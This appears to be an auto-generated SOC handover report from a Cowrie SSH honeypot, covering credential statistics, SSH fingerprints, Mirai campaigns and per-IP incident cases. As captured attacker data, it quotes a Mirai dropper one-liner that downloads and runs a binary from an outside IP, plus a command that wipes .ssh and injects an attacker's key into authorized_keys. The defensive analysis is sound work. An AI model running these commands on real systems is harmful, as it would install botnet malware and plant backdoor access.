# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-12 |
| **Generated At** | 2026-11-12T19:22:11Z |
| **Shift Time** | 19:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **667** |
| Confirmed Threats | **578** |
| False Positives Filtered | **89** (13.3%) |
| Unique Attacker IPs | **258** |
| Countries of Origin | **51** |
| High Severity Cases | **461** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **206** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **5060** |
| Unique Credential Pairs | **1258** |
| Unique Usernames | **250** |
| Unique Passwords | **1113** |
| Successful Auth Pairs | **4883** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3754 |
| `admin` | 118 |
| `ubuntu` | 82 |
| `user` | 53 |
| `test` | 44 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 95 |
| `wmL-o` | 48 |
| `admin` | 37 |
| `root` | 34 |
| `support` | 32 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 32 |
| `rootssssss23424123123` | `rootssssss23424123123` | 28 |
| `root` | `root` | 23 |
| `root` | `root3245gs5662d34111111111` | 22 |
| `root` | `admin` | 19 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `getent` | `109.160.32.126` | 2026-11-12T02:55:04 |
| `root` | `Admin@1234` | `109.160.32.32` | 2026-11-12T02:55:06 |
| `mobotix` | `.*vMG7sg` | `109.160.32.32` | 2026-11-12T02:55:11 |
| `root` | `MegaParty777!` | `109.160.32.126` | 2026-11-12T02:55:15 |
| `root` | `qweasd` | `109.160.32.32` | 2026-11-12T02:55:17 |
| `test` | `1qaz@WSX3edc` | `109.160.32.32` | 2026-11-12T02:55:21 |
| `root` | `m@wdDTjms239uJen` | `109.160.32.32` | 2026-11-12T02:55:25 |
| `vagrant` | `Tj@470804486` | `109.160.32.126` | 2026-11-12T02:55:28 |
| `root` | `inBhTZBkWTJn7Lxt` | `109.160.32.32` | 2026-11-12T02:55:31 |
| `root` | `Phc20200203??` | `109.160.32.32` | 2026-11-12T02:55:35 |
| `root` | `happy` | `109.160.32.32` | 2026-11-12T02:55:40 |
| `shiyang` | `shiyang` | `109.160.32.126` | 2026-11-12T02:55:42 |
| `root` | `chocolat` | `109.160.32.32` | 2026-11-12T02:55:45 |
| `root` | `@Aa123456` | `109.160.32.32` | 2026-11-12T02:55:49 |
| `root` | `Srp42542` | `109.160.32.126` | 2026-11-12T02:55:52 |
| `root` | `ms2026` | `109.160.32.32` | 2026-11-12T02:55:55 |
| `root` | `admintapuramnicusarat` | `109.160.32.32` | 2026-11-12T02:55:59 |
| `root` | `oracle@123.!` | `109.160.32.32` | 2026-11-12T02:56:04 |
| `root` | `cagnew` | `109.160.32.32` | 2026-11-12T02:56:09 |
| `ubuntu` | `qwerasdf1234` | `109.160.32.126` | 2026-11-12T02:56:09 |
_… 4863 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **667** |
| Sessions with Fingerprint | **32** |
| Unique HASSH Fingerprints | **32** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 323 |
| libssh | 72 |
| OpenSSH | 54 |
| Unknown | 7 |
| Paramiko (Python) | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 268 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 52 | 52 |
| `f555226df196...` | Mirai/variant | 37 | 19 |
| `03a80b21afa8...` | Modern SSH client | 15 | 7 |
| `0a07365cc01f...` | Generic scanner | 13 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 268 | 5 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 52 | 52 | Mirai/variant |
| `f555226df196...` | libssh | 37 | 19 | Mirai/variant |
| `03a80b21afa8...` | libssh | 15 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 14 | 12 | — |
| `0a07365cc01f...` | Go SSH scanner | 13 | 5 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 12 | 5 | Generic scanner |
| `7d01d047ace6...` | Go SSH scanner | 8 | 4 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **285** |
| Campaign Clusters | **7** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1059.004, T1082, T1592, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1082, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 35 | 23 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
cat /proc/cpuinfo
```
```
uname -m
```
```
dd if=/bin/busybox bs=1 count=40 2>/dev/null | od -A n -t x1 | tr -d ' \n' || dd if=/bin/sh bs=1 count=40 2>/dev/null | od -A n -t x1 | tr -d ' \n'
```
```
file /bin/busybox 2>/dev/null || file /bin/sh 2>/dev/null
```
Source IPs: `180.93.193.100`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo GQ18264034557
```
```
echo GQ18264034557
```
```
echo ZQ""B; uname -m 2>/dev/null; echo ZQ""E
```
```
echo ZQ""B; for d in /tmp /var/tmp /dev/shm /mnt /var; do if [ -w $d ]; then printf '#DIR#%s\n' $d; break; fi; done; echo ZQ""E
```
```
cd /tmp;{ wget -q http://204.141.236.157:8099/Heyiwei-armv7l -O h || busybox wget -q http://204.141.236.157:8099/Heyiwei-armv7l -O h || uclient-fetch -q http://204.141.236.157:8099/Heyiwei-armv7l -O h || curl -s http://204.141.236.157:8099/Heyiwei-armv7l -o h; };chmod 777 h;{ setsid ./h telnet </dev/null >/dev/null 2>&1 & } 2>/dev/null || ( ./h telnet </dev/null >/dev/null 2>&1 & )
```
Source IPs: `45.144.52.239`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo GQ3823845671
```
```
echo GQ3823845671
```
```
echo ZQ""B; uname -m 2>/dev/null; echo ZQ""E
```
```
echo ZQ""B; for d in /tmp /var/tmp /dev/shm /mnt /var; do if [ -w $d ]; then printf '#DIR#%s\n' $d; break; fi; done; echo ZQ""E
```
```
cd /tmp;{ wget -q http://204.141.236.157:8099/Heyiwei-armv7l -O h || busybox wget -q http://204.141.236.157:8099/Heyiwei-armv7l -O h || uclient-fetch -q http://204.141.236.157:8099/Heyiwei-armv7l -O h || curl -s http://204.141.236.157:8099/Heyiwei-armv7l -o h; };chmod 777 h;{ setsid ./h telnet </dev/null >/dev/null 2>&1 & } 2>/dev/null || ( ./h telnet </dev/null >/dev/null 2>&1 & )
```
Source IPs: `45.144.52.239`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **258** |
| Unique ASNs | **134** |
| High-Risk ASNs | **104** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 50 | HIGH |
| `AS4766` | Korea Telecom | 8 | HIGH |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS22773` | Cox Communications Inc. | 7 | HIGH |
| `AS15169` | Google LLC | 7 | HIGH |
| `AS396982` | Google LLC | 6 | LOW |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (448)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-12e12d131aeb

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]126` |
| **First Seen** | 2026-11-12 02:55 |
| **Last Seen** | 2026-11-12 02:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 02:55:10` | `cowrie.session.connect` |
| `2026-11-12 02:55:12` | `cowrie.client.version` |
| `2026-11-12 02:55:12` | `cowrie.client.kex` |
| `2026-11-12 02:55:15` | `cowrie.login.success` |
| `2026-11-12 02:55:19` | `cowrie.session.params` |
| `2026-11-12 02:55:19` | `cowrie.command.input` |
| `2026-11-12 02:55:20` | `cowrie.log.closed` |
| `2026-11-12 02:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]126` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b937791bebc5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]32` |
| **First Seen** | 2026-11-12 02:55 |
| **Last Seen** | 2026-11-12 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 02:55:05` | `cowrie.session.connect` |
| `2026-11-12 02:55:05` | `cowrie.client.version` |
| `2026-11-12 02:55:05` | `cowrie.client.kex` |
| `2026-11-12 02:55:06` | `cowrie.login.success` |
| `2026-11-12 02:55:06` | `cowrie.session.params` |
| `2026-11-12 02:55:06` | `cowrie.command.input` |
| `2026-11-12 02:55:07` | `cowrie.log.closed` |
| `2026-11-12 02:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]32` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88347b66ff3f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-12 02:58 |
| **Last Seen** | 2026-11-12 02:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 02:58:01` | `cowrie.session.connect` |
| `2026-11-12 02:58:01` | `cowrie.login.success` |
| `2026-11-12 02:58:02` | `cowrie.session.params` |
| `2026-11-12 02:58:02` | `cowrie.log.closed` |
| `2026-11-12 02:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b44ab184877a

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-12 03:05 |
| **Last Seen** | 2026-11-12 03:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 03:05:34` | `cowrie.session.connect` |
| `2026-11-12 03:05:34` | `cowrie.client.version` |
| `2026-11-12 03:05:34` | `cowrie.client.kex` |
| `2026-11-12 03:05:35` | `cowrie.login.success` |
| `2026-11-12 03:05:35` | `cowrie.direct-tcpip.request` |
| `2026-11-12 03:05:35` | `cowrie.direct-tcpip.ja4` |
| `2026-11-12 03:05:35` | `cowrie.direct-tcpip.data` |
| `2026-11-12 03:05:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e95657dfc8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]61` |
| **First Seen** | 2026-11-12 03:27 |
| **Last Seen** | 2026-11-12 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 03:27:57` | `cowrie.session.connect` |
| `2026-11-12 03:27:57` | `cowrie.client.version` |
| `2026-11-12 03:27:57` | `cowrie.client.kex` |
| `2026-11-12 03:27:58` | `cowrie.login.success` |
| `2026-11-12 03:27:58` | `cowrie.session.params` |
| `2026-11-12 03:27:58` | `cowrie.command.input` |
| `2026-11-12 03:27:59` | `cowrie.log.closed` |
| `2026-11-12 03:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adbbaeaf6d18

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-12 03:30 |
| **Last Seen** | 2026-11-12 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 03:30:09` | `cowrie.session.connect` |
| `2026-11-12 03:30:09` | `cowrie.client.version` |
| `2026-11-12 03:30:09` | `cowrie.client.kex` |
| `2026-11-12 03:30:10` | `cowrie.login.success` |
| `2026-11-12 03:30:10` | `cowrie.direct-tcpip.request` |
| `2026-11-12 03:30:10` | `cowrie.direct-tcpip.data` |
| `2026-11-12 03:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb55736200e5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.20[.]147` |
| **First Seen** | 2026-11-12 03:55 |
| **Last Seen** | 2026-11-12 03:58 |
| **Session Duration** | 184s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 03:55:06` | `cowrie.session.connect` |
| `2026-11-12 03:55:09` | `cowrie.telnet.option` |
| `2026-11-12 03:55:09` | `cowrie.telnet.option` |
| `2026-11-12 03:55:09` | `cowrie.login.success` |
| `2026-11-12 03:55:10` | `cowrie.session.params` |
| `2026-11-12 03:58:10` | `cowrie.log.closed` |
| `2026-11-12 03:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.20[.]147` to AbuseIPDB if not already reported
- [ ] Block `120.48.20[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6722ff93e0bf

| Field | Detail |
|---|---|
| **Source IP** | `35.206.178[.]11` |
| **First Seen** | 2026-11-12 03:59 |
| **Last Seen** | 2026-11-12 03:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 03:59:36` | `cowrie.session.connect` |
| `2026-11-12 03:59:36` | `cowrie.client.version` |
| `2026-11-12 03:59:36` | `cowrie.client.kex` |
| `2026-11-12 03:59:38` | `cowrie.login.success` |
| `2026-11-12 03:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.206.178[.]11` to AbuseIPDB if not already reported
- [ ] Block `35.206.178[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe02493c340a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]32` |
| **First Seen** | 2026-11-12 04:00 |
| **Last Seen** | 2026-11-12 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:00:03` | `cowrie.session.connect` |
| `2026-11-12 04:00:03` | `cowrie.client.version` |
| `2026-11-12 04:00:03` | `cowrie.client.kex` |
| `2026-11-12 04:00:03` | `cowrie.login.success` |
| `2026-11-12 04:00:04` | `cowrie.session.params` |
| `2026-11-12 04:00:04` | `cowrie.command.input` |
| `2026-11-12 04:00:04` | `cowrie.log.closed` |
| `2026-11-12 04:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]32` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3323996ad46

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]61` |
| **First Seen** | 2026-11-12 04:00 |
| **Last Seen** | 2026-11-12 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:00:03` | `cowrie.session.connect` |
| `2026-11-12 04:00:03` | `cowrie.client.version` |
| `2026-11-12 04:00:03` | `cowrie.client.kex` |
| `2026-11-12 04:00:04` | `cowrie.login.success` |
| `2026-11-12 04:00:05` | `cowrie.session.params` |
| `2026-11-12 04:00:05` | `cowrie.command.input` |
| `2026-11-12 04:00:05` | `cowrie.log.closed` |
| `2026-11-12 04:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2496afe9dbee

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]126` |
| **First Seen** | 2026-11-12 04:00 |
| **Last Seen** | 2026-11-12 04:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:00:04` | `cowrie.session.connect` |
| `2026-11-12 04:00:05` | `cowrie.client.version` |
| `2026-11-12 04:00:05` | `cowrie.client.kex` |
| `2026-11-12 04:00:06` | `cowrie.login.success` |
| `2026-11-12 04:00:07` | `cowrie.session.params` |
| `2026-11-12 04:00:07` | `cowrie.command.input` |
| `2026-11-12 04:00:07` | `cowrie.log.closed` |
| `2026-11-12 04:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]126` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae113aaa9ee1

| Field | Detail |
|---|---|
| **Source IP** | `125.23.220[.]130` |
| **First Seen** | 2026-11-12 04:09 |
| **Last Seen** | 2026-11-12 04:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:09:38` | `cowrie.session.connect` |
| `2026-11-12 04:09:38` | `cowrie.client.version` |
| `2026-11-12 04:09:39` | `cowrie.client.kex` |
| `2026-11-12 04:09:40` | `cowrie.login.success` |
| `2026-11-12 04:09:41` | `cowrie.session.params` |
| `2026-11-12 04:09:41` | `cowrie.command.input` |
| `2026-11-12 04:09:41` | `cowrie.command.failed` |
| `2026-11-12 04:09:42` | `cowrie.log.closed` |
| `2026-11-12 04:09:43` | `cowrie.session.params` |
| `2026-11-12 04:09:43` | `cowrie.command.input` |
| `2026-11-12 04:09:43` | `cowrie.session.file_download` |
| `2026-11-12 04:09:43` | `cowrie.log.closed` |
| `2026-11-12 04:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.23.220[.]130` to AbuseIPDB if not already reported
- [ ] Block `125.23.220[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5fa97d849ef

| Field | Detail |
|---|---|
| **Source IP** | `125.23.220[.]130` |
| **First Seen** | 2026-11-12 04:09 |
| **Last Seen** | 2026-11-12 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:09:43` | `cowrie.session.connect` |
| `2026-11-12 04:09:43` | `cowrie.client.version` |
| `2026-11-12 04:09:43` | `cowrie.client.kex` |
| `2026-11-12 04:09:44` | `cowrie.login.success` |
| `2026-11-12 04:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.23.220[.]130` to AbuseIPDB if not already reported
- [ ] Block `125.23.220[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21b213f0ee49

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-11-12 04:11 |
| **Last Seen** | 2026-11-12 04:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:11:29` | `cowrie.session.connect` |
| `2026-11-12 04:11:29` | `cowrie.client.version` |
| `2026-11-12 04:11:29` | `cowrie.client.kex` |
| `2026-11-12 04:11:31` | `cowrie.login.success` |
| `2026-11-12 04:11:32` | `cowrie.session.params` |
| `2026-11-12 04:11:32` | `cowrie.command.input` |
| `2026-11-12 04:11:32` | `cowrie.log.closed` |
| `2026-11-12 04:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec410cd2dc4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]75` |
| **First Seen** | 2026-11-12 04:33 |
| **Last Seen** | 2026-11-12 04:33 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_36b7ae46d70ec21e0a9a70f83e639d17_small_control'"'"' '"'"'check_36b7ae46d70ec21e0a9a70f83e639d17'"'"'', printf '\n%s|%s\n' 'check_36b7ae46d70ec21e0a9a70f83e639d17_small_control' 'check_36b7ae46d70ec21e0a9a70f83e639d17', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_36b7ae46d70ec21e0a9a70f83e639d17_small_math'"'"' "$((50*20+40))"', (50*20+40, printf '\n%s|%s\n' 'check_36b7ae46d70ec21e0a9a70f83e639d17_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:33:19` | `cowrie.session.connect` |
| `2026-11-12 04:33:20` | `cowrie.client.version` |
| `2026-11-12 04:33:20` | `cowrie.client.kex` |
| `2026-11-12 04:33:25` | `cowrie.login.success` |
| `2026-11-12 04:33:29` | `cowrie.client.size` |
| `2026-11-12 04:33:31` | `cowrie.session.params` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| `2026-11-12 04:33:33` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]75` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0e3c97bd9a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-12 04:34 |
| **Last Seen** | 2026-11-12 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-12 04:34:57` | `cowrie.session.connect` |
| `2026-11-12 04:34:57` | `cowrie.login.success` |
| `2026-11-12 04:34:58` | `cowrie.session.params` |
| `2026-11-12 04:34:58` | `cowrie.log.closed` |
| `2026-11-12 04:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a3401d5f40

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]75` |
| **First Seen** | 2026-11-12 04:35 |
| **Last Seen** | 2026-11-12 04:36 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
